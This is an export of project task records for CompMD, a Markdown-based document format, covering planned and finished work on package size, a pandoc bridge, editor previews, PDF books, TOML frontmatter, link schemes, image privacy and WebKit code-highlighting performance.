tasks.name: Smaller packages: only the locale data a reader needs
tasks.description:
Asked by the user (2026-10-30): don't carry locale data a reader never uses; keep the packages as small as they can be.

**Today.** The processor formats by CLDR (`md.date`, `md.number`, `md.currency`, …, for `md.lang`) with ICU4X's compiled data for every locale (`icu` 2.4.0 in `crates/processor/Cargo.toml`), so every language formats offline. All of it is inside `@compmd/processor`'s WebAssembly: 808 KB gzipped, a tarball of 844 KB.

**First, measure** how much of the WebAssembly is locale data (a build with only `en`, against today's), so the choice rests on numbers.

**The alternatives to weigh, then settle with the user:**

1. **Two builds**: a small one with a few locales (`en`, `tr` and the most used few more, the list to settle), and a full one with all of CLDR, for example `@compmd/processor` and `@compmd/processor-full`, or a Cargo feature for the crate.
2. **Locale data as separate packages**: one processor without locale data (or with `en` only), and the data for other locales loaded when a document's `md.lang` needs it (ICU4X's blob data, per locale or per group, for example `@compmd/locale-tr`), cached like any module.
3. A mix: the small build with its locales compiled in, and the others loadable.

For each: the sizes (gzipped, the WebAssembly and the tarball), what a host does to use it, what a document in a locale that isn't there shows (a fallback locale and a diagnostic, which may need a change to the spec's formatting functions), offline use, the crate's features, and what the release workflow publishes.

**Then** implement the chosen one: the build, the packages, the website and playground on the right build, READMEs and `RELEASING.md`, tests for a missing locale, sizes in the bench.

## From earlier work

- The WebAssembly is about 946 KB gzipped now.
- The measurement needs an English-only build of ICU4X's data, made with ICU4X's `icu4x-datagen` tool (`cargo install icu4x-datagen`), used only to generate the data for the measurement, nothing added to the project. The user put the task in the backlog (2026-11-17) before it was installed: ask for the go to install it when the task is taken again, then bring the numbers and the three options for the user to choose from.

tasks.name: A pandoc reader, so pandoc turns CompMD documents into PDF, Word, EPUB
tasks.description:
A way for pandoc to read CompMD documents, so authors and hosts turn them into anything pandoc writes: PDF (through LaTeX or Typst), Word, EPUB, HTML. Proposed by the user on 2026-11-02, while the site's PDFs were being made, as something wanted for the future anyway.

## Background
- The guides and the spec are plain GitHub Markdown, not CompMD: pandoc's own `gfm` reader already reads them, so the site's PDFs don't need this. They are printed with Chrome, which keeps the site's look; pandoc would give book typography and page numbers in the contents instead.
- A CompMD document needs the processor: imports, definitions, `if`/`each`, interpolation and layout only mean something after it expands them (spec §12.3).

## Design first (a design document, reviewed with the user, before code)
Never reimplement the syntax (no Lua parser of CompMD): build on the processor, so pandoc gets what the spec says.
- **The bridge:** the processor's expanded tree, translated to pandoc's JSON AST. Where it lives: a small CLI (`compmd pandoc doc.comp.md | pandoc -f json -o doc.pdf`, from the Rust crate), and/or a pandoc custom reader in Lua that calls it (`pandoc -f compmd.lua doc.comp.md -o doc.pdf`), and/or the wasm package for JS hosts.
- **The mapping:** mdast nodes to pandoc's (most map one to one: headings, lists, tables, code, math, footnotes, alerts as Divs); `box` and the layout built-ins as pandoc Divs with their params as attributes, so a pandoc filter or a template styles them; host-language components as their fallback (spec §4.5), since pandoc runs no code; inputs as their current value, as a processor that isn't interactive shows them (spec §8.7); a rendered code block (spec §7.7) as its code block, or its `alt`.
- **What the request carries:** the document's files, data and packs, as for any processor (`process` and its request); the inputs from the command line.
- **Diagnostics:** printed as the processor's, with a strict mode that fails on an F (spec §10.1).
- **Testing:** the conformance set's expanded trees through the bridge, and a few documents to PDF and DOCX in CI (pandoc and Typst are small to install; LaTeX is large).

## Not in this task
Using it for the site's own PDFs; layout fidelity beyond what pandoc's Divs and a template can give.

## From earlier work

A draft design is committed, not yet approved: `docs/pandoc.md` (compmd `8f1d683`, revised in `83a25eb` after the user's review: components as they print, use cases, its own repository `comp-markdown/compmd-pandoc`). It proposes the expanded tree written as pandoc JSON by a new `compmd-pandoc` crate; a `compmd pandoc` command (a new `compmd-cli`) and a Lua reader; the mapping (boxes as Divs, host components as fallbacks, inputs as values, frontmatter as metadata); packs, data and inputs from flags; tests over the conformance set and PDF/DOCX via Typst. The user put the task in the backlog (2026-11-17); start from the draft when it is taken again, and build after approval.

tasks.name: Find unused dependencies and exports, with a tool
tasks.description:
Found in an earlier scan of the repository (2026-11-06): two of its checks couldn't be done well by reading files one by one.

## What is left
- **Unused dependencies** in the `package.json` files of npm-packages/create-pack, devtools, editor, editor/packs/minimermaid, pack, registry, render, sandbox, vite and wasm, compmd-packs/mermaid, guides, website and website/app, and in the `Cargo.toml` files of `processor` and `wasm`. (The root `package.json` has none.)
- **Unused TypeScript exports**: exported functions, classes and types that nothing imports and that aren't part of a package's public entry. (Rust needs no such check: clippy's `dead_code` already fails on unused crate-private items.)

## Why it needs a decision
Both need a tool that sees the whole repository: [knip](https://knip.dev) for the TypeScript packages, [cargo-machete](https://github.com/bnjbvr/cargo-machete) or `cargo udeps` for the crates. Running one, even once through `pnpm dlx`, runs code from outside the repository, which the session's permissions refused. To decide:
1. Add knip (and cargo-machete) as dev tools, perhaps run in `cargo make ci` so the debt doesn't come back; or
2. Run them once by hand, outside an agent session, and file what they find; or
3. Drop the check.

## Then
Remove what is unused, with no change in behaviour; `cargo make ci` and `pnpm -r lint` green.

tasks.name: Make a table's rows from data (analyse the options first)
tasks.description:
Found while writing the website's table example (2026-11-06): a document can't make a table's rows from data. The author wanted each city's row of a GFM table made by an `each` over a data file; today the rows have to be written out.

## Why it can't today
- `each` joins what its body makes with `join=list` (a one-item list body, the copies one list) or `join=inline` (one line, with `sep=` and `last=`). Neither makes a table.
- A table row is a line of a GFM table, and a component line can't stand among a table's lines, so an `each` can't sit between the rows either.

## To analyse, before deciding
Options and their trade-offs, each tried on real documents (a table of cities, a changelog table, a price list), in CompMD and in a plain renderer:
- `join=table` on `each`: the body a one-row table, header included; the copies become one table, the header once. How headers that differ are reported, what `:: #empty` gives, alignment rows.
- A built-in table component (`::: table {rows=(…)}` with columns declared), and how it degrades.
- A template slot of a container that makes rows.
- Leaving tables to host-language components, and saying so.

## Then
The chosen option settled with the user, written into the spec with conformance cases, implemented in the processor, and the website's table example (`website/content/weather.comp.md`) made from data with it.

tasks.name: State a component keeps, the design (and the spec)
tasks.description:
Asked by the user, 2026-11-10. An interactive drawing in a document (an Excalidraw diagram the reader draws in place) has **state the component itself manages**: the drawing, which isn't a param the author writes and isn't an input (spec §8.7: values of a few types the document reads). Today a component only gets params and slots and can `set` its bound inputs (spec §7.4), so a drawing has nowhere to live.

## Questions to settle, with examples
- **Where the state lives:** in the document (a fenced block the component owns, the way a signature fence belongs to a component), beside it (a file, like an image the document links), or in the host's storage, named from the document.
- **The likeness to attachments:** a drawing is a file the document owns, as an image is; can one mechanism serve both (a component's own files, which a host stores the way it stores a document's images and attachments)?
- **The host contract:** what the component gets (its state, a way to save it, size limits), when it saves (debounced, on close), and conflicts when two people draw at once.
- **Trust and safety:** a strict component may write only its own state, never other content; what a plain Markdown renderer shows (spec §14: a fallback image or text).
- **Full screen:** whether a component may ask the host to show it full screen, and how the host keeps it a document's content (spec §15).

## Do
A topic design in `docs/`, with real example documents and the spec change it needs (§7.4, §8.7, §14, §15, with a CHANGELOG entry), reviewed with the user. How an application that hosts CompMD stores such state is that application's own decision, once CompMD's design is accepted.

tasks.description:

- What it covers: frontmatter and the `md` key, blocks (`:::`), inline components, interpolation (`{{…}}`) with CEL inside, the fences of component definitions with their languages injected, and the opt-in syntax.
- Where it lives and how it's published (npm and crates.io, as tree-sitter grammars are), and which editors to try it in.

## Then

Build it, with tests from the spec's examples and test suite, so it parses what the spec says.

## Notes

Each push needs the user's go.

## From earlier work

- A first design (`docs/tree-sitter.md`, compmd `b8809c7`: two grammars extending tree-sitter-markdown's by inheritance, its C scanner copied with CompMD's lines, CEL injected from a small tree-sitter-cel, queries for highlight, fold, inject and textobjects, tests from the spec and the conformance set, in `tree-sitter/`, published to npm and crates.io) was replaced by the combined editor-support design, `docs/editor-support.md`. Build what that design says.
- Editors: VS Code, Neovim, Helix, Zed and Emacs, as the editor-support design decides.

tasks.name: A browser preview for editors
tasks.description:
Asked by the user (2026-11-17): the playground without its editor side, a page in the browser that shows one document as it renders, opened from each editor. The design is in: [editor support](docs/editor-support.md), decision 8, and [the language server](docs/language-server.md), decision 13.

Split on 2026-11-25 (the user's go) into four parts: CMD-424 (the renderer's line on each block), CMD-425 (the page on `@compmd/devtools`), CMD-426 (the server in `compmd-lsp`), and this one, which opens it.

## Part 4: opening the preview

- The command `compmd.preview` (`workspace/executeCommand`) and the code action *Open preview* on any line of a document, which start the preview's server for the document when it isn't running and open the page.
- The system browser opened with `std::process`, with no dependency: `open` on macOS, `xdg-open` on Linux, `cmd /c start` on Windows (decided 2026-11-25); the setting `compmd.preview.browser`, when given, names the browser instead (decision 12).
- The editor packages' *toggle* (IN-1) comes with each package (CMD-26 to CMD-29).

## The document's worker and the preview (from CMD-426)

CMD-426's `Preview` (`crates/lsp/src/preview.rs`) serves what it is given; this task gives it, from the document's worker:

- `Preview::start(PreviewFiles::embedded(), store, proxy)`: `store`, the project's packs for the frames (a `Store` over its folder and installed packs, and those fetched); `proxy`, a `registry::Proxy` of the configuration's registries, `None` when it names none. A build without the preview (`embedded()` is `None`) says so to the editor.
- `set_request`: the document's request but its text: its path, the files and the packs' files its processor read (a recording `Files` and `Packs` around the worker's), its policy, ambient packs and allowed origins; again after each processing, so a file read for the first time, or a project read again, is a `reload`.
- `change(text, line)`: after each change, the line being edited, from its range.
- The preview stops when its document closes, as the `Preview` is dropped.

## Tests

The command and the code action through the server, with the browser's launch replaced by a recorder in the tests; the worker's request and changes reaching the preview.

Each push needs the user's go.

tasks.name: CompMD guides as proper PDF ebooks: contents with page numbers, book typography, a cover, example previews
tasks.description:
Turn the guides' PDFs (CMD-157) from printouts of the site into PDF books: a contents page with page numbers and bookmarks, book typography, a cover page, and a picture of what each example renders next to its code. Asked for by the user on 2026-11-02, after reviewing CMD-157's PDFs.

## Where CMD-157 left it
- `scripts/pdf.ts` prints each book with Chrome (`page.pdf`, `build/print.ts`) from a page of the whole book (`build/book.ts`, `src/Book.svelte`): its contents page from the site (chapter titles as links, no page numbers), then each chapter on a new page. The PDF has bookmarks (the outline, from the headings), page numbers at the foot, and the site's look; the print styles are `@media print` in `src/spec.css`. The dev server prints one when asked for. The site check reads each PDF with `pdfjs-dist`.
- **Why there is no proper contents page:** Chrome's printing has no `target-counter()` (CSS Paged Media), so it can't print the page a heading lands on; nor running heads (`string-set`), per-page numbering rules or unnumbered pages. The bookmarks exist, but viewers show them only in a sidebar.

## What a book needs
- **A cover page:** the book's title, what it is for, the packages' version it is written for, the site's address; no page number.
- **A contents page with page numbers:** every chapter and its sections, with dot leaders, each entry a link; and the bookmarks, as now.
- **Book typography:** each chapter opening a page with its number and title set as an opener; the chapter's title as a running head; page numbers that skip the cover (and roman ones for the front matter, if wanted); widows and orphans controlled; code and tables that break well.
- **Previews of the examples:** next to each CompMD example in a chapter, a picture of what it renders (light scheme), so a reader on paper sees the result. Taken at build time with Playwright from the example's document rendered as a host renders it (the playground's sandbox, or the guides' own example builds), stored with the book's build, never committed if it can be made; described in its `alt` by the example's own text.
- **Try it links stay:** they keep pointing at the site's playground (`https://compmd.hakanserce.com/playground/?doc=…`), which still works from a PDF.

## How, to settle first (options weighed on 2026-11-02)
1. **Paged.js in Chrome (recommended then):** the CSS Paged Media polyfill (`target-counter`, `string-set`, `@page` rules, named pages), run in the book's page before Chrome prints it. Keeps the site's look and Shiki highlighting; a build-only dev dependency; slower printing; its development has slowed.
2. **Two passes in Chrome:** print, read each heading's page from the PDF's outline (pdf.js), write the numbers into the contents, print again. No dependency, but only the contents gets numbers: no running heads or numbering rules.
3. **WeasyPrint:** a paged-media engine reading the same static HTML and CSS; the best typography of these, but Python in the build and CI.
4. **Pandoc with LaTeX or Typst:** real book typesetting, not the site's look; CompMD code needs a syntax definition for pandoc's highlighter. See the pandoc reader task (backlog) for CompMD documents themselves.

## The spec
The same book treatment may suit the spec's PDF (a cover, a contents page with numbers); decide with the user.

## Tests
The site check: the contents page lists every chapter with a page number that is the page its heading is on (read with pdf.js); the cover has no number; every example in a chapter has its preview next to it; the bookmarks as now.

notes.text: User, 2026-11-17: a proper book format (cover, margins, a table of contents with page numbers and the rest), not the site’s look. The tool is still to choose.

How to typeset the books (the task’s options): (1) Paged.js in Chrome, a build-only dev dependency, keeps the site’s look, page numbers in the contents, running heads, numbering rules; (2) two passes in Chrome, no dependency, but only the contents gets page numbers; (3) WeasyPrint, Python in the build and CI; (4) pandoc with LaTeX or Typst, not the site’s look. Recommended: (1), as weighed on 2026-11-02. tasks.name: Decide whether a document's remote images are asked about like data
tasks.description: Revisit the tracking leak of a document's remote images, left open in CMD-179 (which loads them without asking, decision 3A). ## The gap Spec §15's *Privacy* paragraph names images only as the baseline ("as an image in any Markdown does"), then gives rules "for fetches at view time": the reader decides the origins (§8.6), no credentials, no `Referer`, shared caches. Sandbox rule 2 covers component code, not the document's images. ## To decide with the user - Whether images count as fetches at view time, and MUST or SHOULD (SHOULD keeps the leak). - Both modes alike (the spec has no frame/host split), so host mode would ask too. - One answer per origin covering data and images (the spec speaks of origins, not kinds), or separate answers. - Alt text while an image is refused or pending. ## Then The spec edit and changelog line, and `@compmd/sandbox` asking before remote images in both modes, through the per-origin answers of `origins.ts`.

notes.text: Do a document’s remote images (`![](https://…)`, ``) count as fetches at view time, asked about like data (§8.6)? MUST or SHOULD? Recommended: MUST, so a document can’t tell its author who opened it; SHOULD keeps the leak. → Yes: images are fetches at view time, MUST ask, since they can track otherwise.; Both modes alike, so host mode asks too? Recommended: yes, the spec has no frame/host split. → Yes: host mode asks too.; One answer per origin for data and images together, or separate answers? tasks.name: Markdown-rs: a `---` underline after no paragraph is a thematic break (wooorm/markdown-rs#286)
tasks.description:
Reported upstream as [wooorm/markdown-rs#286](https://github.com/wooorm/markdown-rs/issues/286), found while fixing CMD-99's panic ([#287](https://github.com/wooorm/markdown-rs/pull/287)). A line of `-` that could be a setext underline but follows no paragraph (after a heading, or after only definitions) becomes paragraph text, where micromark makes it a thematic break: `a\n=\n---` gives `

a

\n

---

`, micromark `

a

\n
`. `[a]: b\n-\n-` gives `

-

\n
    …`, micromark `

    -

    `. The fork (`compmd-markdown`) has the same bug. ## Steps 1. Design the fix with the user first: `heading_setext`'s resolver turns an underline with no paragraph before it into paragraph text, so the line has to fall back to what it would otherwise be (a thematic break, or a list item). Settle where that decision belongs before changing code. 2. Fix it in the fork, with tests that assert micromark's HTML for the inputs in #286 and #210's `Foo *bar*` case. 3. Draft an upstream PR from the fix, without the fork's CompMD constructs; the user decides who posts it.

notes.text: Where the fix goes. (A) Resolver: with no paragraph before, a `---` underline becomes a thematic break; small, but `-` and `- -` stay wrong. (B) Tokenize time: `heading_setext::start` refuses an underline unless the content before holds paragraph text, so the line falls through to thematic break or list, as micromark does; right everywhere, but `start` must know a content is only definitions. Recommended: (B), matched to micromark’s rule. OK? → Option (B): `heading_setext::start` refuses an underline unless the content before it holds paragraph text, matched to micromark’s rule, so the line falls through to a thematic break or a list.

Fork commit `da72b68` (CompMD `84eb4dd`): `heading_setext::start` parses the content before a `-`/`=` line and takes it as an underline only when it holds paragraph text, as micromark does. The resolver’s move-into-next-paragraph code is gone. Tests 14-a…h in `tests/fuzz.rs` (#286, #210). Upstream PR draft: scratchpad `upstream-pr-286.md`; who posts it is yours.
Approved: Approved in review, with no comments (fork `da72b68`); the user: every review approval is a task approval.
Approved: a `-`/`=` line after no paragraph falls through to a thematic break or list, as micromark (fork `da72b68`). Upstream PR draft ready; who posts it is the user’s.

tasks.name: Frontmatter accepts TOML (`+++`) as well as YAML
tasks.description:
Decided with the user (2026-11-06, while checking [wooorm/markdown-rs#270](https://github.com/wooorm/markdown-rs/pull/270) for CMD-60): CompMD frontmatter may be YAML (`---`) or TOML (`+++`). Today the spec says only YAML is frontmatter and TOML is ordinary text ([the spec’s *YAML* paragraph](compmd-spec-v1.md#:~:text=Only%20%60%2D%2D%2D%60%20YAML%20is%20frontmatter)), so the fork adds `frontmatter_toml` to turn TOML off.

## Settle with the user first
- How TOML values map to `md.doc`: dates and datetimes (YAML's core schema keeps `2026-10-21` a string), integers and floats, and tables and arrays of tables.
- Which F033 limits apply to TOML (size cap, duplicate keys).
- Whether diagnostics and conformance treat the two formats alike.

## Then
- **Spec:** the frontmatter section and a `CHANGELOG.md` line.
- **Processor:** parse TOML frontmatter (`processor/src/parse.rs` sets `frontmatter_toml: false` today) into the same values as YAML.
- **Conformance:** move the TOML case out of `conformance/literal/`, and add TOML cases.
- **Fork:** remove `frontmatter_toml` from `compmd-markdown`, since upstream's default (both formats) is then right; that is one less reason to keep the fork.

## Done when
`cargo make ci` and `pnpm -r lint` are green, Rust coverage is at least 99%, and the conformance suite covers TOML frontmatter.

notes.text: TOML values in `md.doc`: recommended, dates and datetimes as ISO strings, as YAML’s core schema keeps `2026-10-21`; integers and floats as numbers; tables as maps; arrays of tables as lists of maps. So a document reads the same whichever format it uses. OK? → Agreed: dates and datetimes as ISO strings, integers and floats as numbers, tables as maps, arrays of tables as lists of maps.; F033 limits for TOML: recommended, the same size cap, and a duplicate key is F033 as in YAML (TOML forbids them anyway). OK? → Agreed: the same size cap, and a duplicate key is F033.; Diagnostics and conformance: recommended, both formats alike, with each YAML frontmatter case given a TOML twin where the format matters (types, nesting, errors). OK? → Agreed: both formats alike, each YAML frontmatter case given a TOML twin where the format matters.

Parsing TOML in the processor needs a TOML crate, a new direct dependency of `compmd` (and so of the WebAssembly, ~877 KB gzipped today). `toml_parser` and `toml_datetime` are in the lockfile already, through another crate; `toml` 0.9 (the toml-rs project, on them) is the usual one. Recommended: `toml` with only its `parse` feature, and its added size measured before the merge. Add it? → Add `toml` with only its `parse` feature, and measure the WebAssembly’s added size before the merge.

TOML frontmatter read into the same document as YAML (`parse/toml.rs`, places kept, keys in order), `toml` node in the tree and schema, spec §2.1/§10.2/§12.2, 3 TOML conformance twins, `frontmatter_toml` removed from the fork. tasks.description:

tasks.name: A host's own link schemes
tasks.description:
Found on 2026-11-16: a link in an application's document, `[Books](app:item/<id>)`, renders as plain text.

## The gap

- `@compmd/render`'s `safeUrl` keeps only relative, `http:`, `https:` and `mailto:` URLs, for every link, image and wiki link, and renders any other scheme as text.
- The spec restricts schemes only for interpolated URLs (§8.1, W109). For a literal Markdown link it says nothing, so a host can't give the renderer a scheme of its own, such as an app's `app:item/…` (the application's design record), or the URL its `wikiLink` gives.

## The change

- **The spec:** a rule for literal link and wiki-link destinations. A renderer keeps relative, `https:`, `http:` and `mailto:` links, and the schemes its host names as its own; any other renders its text without the link. Schemes that run code (`javascript:`, `data:`, `vbscript:`) can never be named.
- **The implementation:** an option in `@compmd/render`'s page and `@compmd/sandbox`'s `createSandbox`, the host's own link schemes, checked against that rule; a click on such a link reaches the host as any link does.
- **The rest:** tests and docs, and a CompMD release. Spec changes and every push need the user's go.

notes.text: Spec §15 (`8bf5e82`): links, references and wiki links may use relative, https, http, mailto or a scheme the host names; `javascript`, `vbscript`, `data`, `blob`, `file` never. `linkSchemes` in `@compmd/render` and `@compmd/sandbox` (sent to every frame with its level; protocol schema updated). Images and raw HTML unchanged. Tests in both packages, both modes; CompMD ci passes. **Left after approval:** the CompMD release (your go).

tasks.name: The first block of a language highlights without blocking the page in WebKit
tasks.description:
In WebKit (Safari, and the atm app's WKWebView), the first code block of a language on a page takes about **1.3 to 1.5 s** to highlight, and the page is blocked meanwhile; Chromium takes a few ms. Found measuring a large review in the atm app (atm's ATM-587, CR-1 there): of every run highlighted, the first TypeScript one (662 characters) took 2.2 s to render; the rest a few ms each.

## Likely cause
Shiki readying the TypeScript grammar's regular expressions with the Oniguruma (WASM) engine, which WebKit compiles slowly the first time. Confirm first: a page with one TypeScript block, in Safari, timed with and without the grammar already loaded.

## What could change, in order of preference
1. Highlight in a **Web Worker**, so a slow grammar never blocks the page: the block shows as written and is coloured when ready.
2. Shiki's **JavaScript regex engine** for the grammars it supports, which starts without compiling WASM: measure whether it is faster in WebKit.
3. Ready the grammars a page needs **in idle time**, before its first block needs them.

## Done when
The first TypeScript block in WebKit blocks the page for under 100 ms, measured the same way.

## To reproduce
atm's `dashboard/tests/e2e/real-review.spec.ts` measures a real review in WebKit and Chromium (its *opening* line names each long frame and when the grammars arrived).

tasks.name: Code blocks: each line an element, and its box in the view's lines()
tasks.description:
Asked from atm (ATM-588, 2026-11-18). atm's diff viewer shows a file's two sides as two code blocks side by side, and wraps long lines. To keep the two sides' lines level when one wraps, the host makes a line as tall as its counterpart, which it couldn't do with no element per line: a highlighted block was token spans between newline text nodes (`npm-packages/sandbox/src/highlight/highlight.ts` `draw`), and an unhighlighted one plain text.

## Decided (2026-11-18)

- **Each line an element, highlighted or not:** `<span class="compmd-line" data-line="N">`, drawn by `@compmd/render` (`code-lines.ts`), its line break inside it, so the block's text and what a reader copies are the code's. The class has the renderer's `compmd-` prefix, so a host's own `.line` can't clash.
- **N is the line in the current text**, the numbering of `lines()` and the origins (atm's opening fence is line 1, so its code starts at 2). A change before a block moves it, and the renderer numbers its lines again (option 1 of three; the others: numbers within the block, or those and the block's first line on its `<pre>`). Revisit if renumbering shows up in live editing. A tree without origins gives lines without `data-line`.
- **The base styles make a line a block**, so a host can size it (`.compmd-line { min-height }`).
- **The highlighter fills the lines:** each line's tokens in its element, which keeps its attributes. `CodeHighlighter`'s contract says so, and `CODE_LINE` is exported.
- **Hosts use two calls, never the markup** (decided after CR-6's first round): `lines()` finds the lines, and `lineHeights(heights)` (`Page`, the frame protocol's `lineHeights`, version 5, and the sandbox's `View`) sizes them by their line in the text, through later renders. The line elements, `data-line` and the numbering are the renderer's own, so option 3 or another stays open without touching hosts. CMD-251 does the same for highlighters.
- **`lines()` already gives a code block's lines**; atm saw none because it processes a diff's run as task text, which has no origins, so that's atm's to change (process the run as a document). Not part of this task.

## Found on the way

`lines()` merged a wrapped line's visual lines into one box in WebKit, whose text boxes are a little taller than their lines are apart (15.13px every 15px): boxes are one visual line only when they overlap by more than half the shorter's height. This held for a wrapped Markdown paragraph too.

## Tests

- The drawn block's text is the code's, with one element per line, a blank line too; numbered for fenced and indented blocks; numbered again, the same elements, when a change before the block moves it; none without origins.
- The highlighter keeps the line elements and their attributes, a blank line's too, and leaves another renderer's `<code>` as it is.
- In Chrome and WebKit: the lines' heights are the block's (no line break makes a line of its own), copying gives the code, and `lines()` gives a wrapped line several boxes and a blank line its own.

notes.text: lease expired (claude:79612601)
CR-6, approved: the change it covers is 5d57d4f.
Approved: CR-6 approved.

Each code line an element, numbered with its line in the text and renumbered when an edit moves its block, all private to the renderer; hosts find lines with `lines()` and size them with `lineHeights()`, in both page modes (frame protocol 5). `lines()` gives a wrapped line one box per visual line in WebKit too. CR-6 approved.

tasks.name: Highlighters give tokens, and the renderer draws them
tasks.description:
A highlighter (`CodeHighlighter`, `@compmd/render`) writes DOM into the renderer's `<code>`, so it has to know how the renderer draws a block: since CMD-250, that each line is an element of its own, whose attributes it must keep. That is the renderer's private detail (the line elements, `data-line`, how lines are numbered), which may change (CMD-250's option 3), and a host's own highlighter shouldn't break when it does.

## Change

- `CodeHighlighter` gives tokens instead of writing DOM: `(code, language) => Promise<lines | undefined>`, each line a list of tokens with their text and their style (a colour per theme, and the font style), `undefined` for a language it doesn't highlight.
- The renderer draws them into its own line elements, after checking that they are the block's text, and drops tokens that come after a newer text (as `highlightWith` does today).
- `@compmd/sandbox`'s Shiki highlighter (`shikiHighlight`, `highlightWith`) gives Shiki's tokens as they are; its `draw` moves into the renderer.
- Nothing about lines is exported for highlighters (`CODE_LINE` is the renderer's own).
- The READMEs give the new contract; the release notes name the break: a host's own highlighter returns tokens.

## Tests

- The renderer draws a highlighter's tokens into a block's lines, keeping the lines' numbers, and keeps the text when the tokens aren't its text or don't come.
- Shiki's highlighter gives tokens for a language it highlights, and none for one it doesn't.
- The browser tests of code blocks, in both page modes, light and dark, as today.

tasks.name: Spike: code highlighting's cost in WebKit, and what lowers it
tasks.description:
A host that shows many code blocks (a diff viewer: hundreds of short runs, each its own view) reports that in WebKit highlighting blocks the page for seconds, while Chromium is smooth: one frame of over a second when the first block's grammar loads, then about 24 ms per run, piled into frames of 100 ms to 1 s. This spike measures it on a test page of our own and tries each way to lower it; the results decide what goes into the packages, as tasks of their own. Nothing here changes the packages.

## The test page

`spikes/highlight-perf/`: a page of many short TypeScript runs, each a page of its own (`@compmd/render`'s `createPage`), as a diff viewer has them, with the highlighter swapped per variant; a script that opens it in Playwright's WebKit and Chromium, scrolls through it as a reader skims, and reports.

## What is measured

- **Blocked:** the time in frames over 50 ms, from the gaps between animation frames (WebKit has no long-task API), and the longest frame, on opening and over the skim.
- **Waiting:** from a run's page rendering to its block highlighted, median and 95th percentile.
- **Where the time goes:** Shiki's setup, tokenizing, and drawing the tokens.

## Variants

1. Today's: a Shiki per view, every block highlighted as it renders.
2. One Shiki for the page, shared by its views.
3. Sliced: a block per task, yielding between, the blocks on screen first.
4. Grammars prepared ahead: Shiki's precompiled languages with its raw JavaScript engine.
5. Tokenizing in a worker (host mode; a strict frame's policy refuses workers).
6. Oniguruma as WebAssembly (host mode; a strict frame's policy refuses WebAssembly).
7. A cache of tokens by text and language, for a run seen again.
8. The combinations that the single variants suggest.

## Done when

tasks.name: One base-rules stylesheet per document, shared by its pages
tasks.description:
A host that opens many pages in one document (a diff viewer: a page per run) pays, per page, costs that belong to the document. Each one restyles the whole host document, about 1 s each on a large page in WebKit:

- `createPage` makes a `Stylesheet` of its own (`npm-packages/render/src/page.ts`), which assigns `document.adoptedStyleSheets` on open and again on destroy, and holds the whole `BASE_RULES` (`npm-packages/render/src/styles.ts`);
- `new Schemes(root)` then reads `getComputedStyle(root).colorScheme` (`npm-packages/render/src/scheme.ts`), which forces the recalculation at once; the page reads it again at every render, and so does the sandbox's view (`followScheme` in `npm-packages/sandbox/src/sandbox.ts`), which tracks the scheme a second time in host mode.

The spike CMD-252 ([its README](spikes/highlight-perf/README.md)) measured the first with every page kept mounted (43 s blocked over a skim in WebKit, highlighting off); its page's host document is small, so it missed the cost of each open.

## Change

- **One stylesheet per document**, shared by every page and region in it without an option: made with the document's first page, adopted once, removed with its last. The base rules are in it once.
- **Block class names are unique in a document and never used again**, also after a page is destroyed. Today each page counts from `compmd-b0`, so one page's rules match another's blocks.
- **A destroyed page's rules leave the sheet.**
- **A page whose blocks have no rules writes nothing to the sheet.** The sheet is still written as a whole when its text changed; writing rule by rule is a task of its own.
- **The colour scheme is read when something needs it**: when the first follower (a component, a frame) is there, and from then on as now (each render, the reader's preference, printing, `scheme()`). A page with no follower never calls `getComputedStyle`. The scheme stays the element's own (spec §7.4), never one per document.
- **Host mode tracks the scheme once**, not in the view and in the page both.
- **The value guard stays** (`safe` in `styles.ts`).
- **Docs:** `@compmd/render`'s and `@compmd/sandbox`'s READMEs say what a page costs, what a document shares, and that many pages in one document is a supported use.

## Tests

- Unit (`styles.test.ts`, `scheme.test.ts`, `page.test.ts`): two pages, one adopted sheet, assigned once; destroying one keeps the sheet and the other's rules and removes its own; destroying both removes the sheet; two documents, two sheets; names not used again after a destroy; a page with no follower never calls `getComputedStyle`, at open or at render; a follower gets the scheme at mount and its changes.
- Browser (Chrome and WebKit): two pages in one document whose blocks style differently, each styled as its own; a component follows a scheme switch in both modes.
- **Measured** on the spike's page, with a large host document (about 20,000 elements) and 100 pages opened and closed: the assignments to `adoptedStyleSheets`, the calls to `getComputedStyle` and `replaceSync`, and the frames blocked, before and after, in WebKit and Chromium. Account for every `getComputedStyle` call on that page. The numbers go in the spike's README.

tasks.name: The document's stylesheet: a block's rules written without restyling the document
tasks.description:
After CMD-253 a document's pages share one stylesheet, and `Stylesheet.flush()` still writes its whole text with `replaceSync` whenever a block's rules changed (`npm-packages/render/src/styles.ts`). In a host document with many pages of styled blocks (rows, grids, breakpoints), each such write may restyle the whole document.

## Measure first
On the spike's page with a large host document (`spikes/highlight-perf`, as CMD-253 left it), with pages whose blocks have rules: what a `replaceSync` of the whole sheet costs against `insertRule` and `deleteRule` of one block's rules, in WebKit and Chromium. Whether `insertRule` avoids a document-wide restyle in WebKit is not known; the numbers decide.

## Change
What the numbers support: rules inserted and deleted per block, or the writes of every page in one animation frame joined into one, or both. Breakpoint rules keep their order, so wider ones win. Each rule passes the value guard (`safe`) as now.

## Tests
Unit tests for the order of rules and for a destroyed page's rules leaving the sheet; the measurement's numbers in the spike's README.

tasks.name: Settling: the document's waits shared by its views
tasks.description:
Each view has a settle loop of its own (`npm-packages/sandbox/src/settling.ts`), which at every change lists the document's `link[rel=stylesheet]` elements and awaits `document.fonts.ready`. Those are the document's facts: with many views in one document, each pays for them.

## Change
The document-wide waits (stylesheets loaded, fonts ready) are shared by the views settling at the same time: one scan for all of them. What a view waits for of its own (its drawing, its frames, its images, a still animation frame) stays its own, and `settled` means what it does now ([the protocol's *Settled*](docs/sandbox-protocol.md#settled)).

## Tests
Unit tests: many views changing together scan the links once; a view still settles after its own latest change. The existing settling tests pass unchanged.

Approved: Approved by the maintainer (CR-12).

tasks.name: Code highlighting: one Shiki for a page's views
tasks.description:
In host mode every view makes a highlighter of its own: `hostPage` calls `framesHighlight(options.base)` per view (`npm-packages/sandbox/src/pages.ts`, `npm-packages/sandbox/src/from-frames.ts`), and each `shikiHighlight()` makes its own Shiki (`npm-packages/sandbox/src/highlight/highlight.ts`), which Shiki warns about. Each then pays for its grammar again: in WebKit, with a view per run of code, 5.9 s blocked over a skim against 0.9 s with one Shiki, and a run tokenized in 14 ms against 1 ms (the spike CMD-252, [its README](spikes/highlight-perf/README.md), *today* against *shared*).

## Change
- One Shiki for the views of a page that load the frames' `highlight.js` from the same `base`: made with the first code block, shared by every view after it, with the languages loaded so far.
- A language loaded for one view is there for the others; two views asking for one at once load it once.
- In frame mode nothing changes: a frame is a page of its own, with one Shiki already.
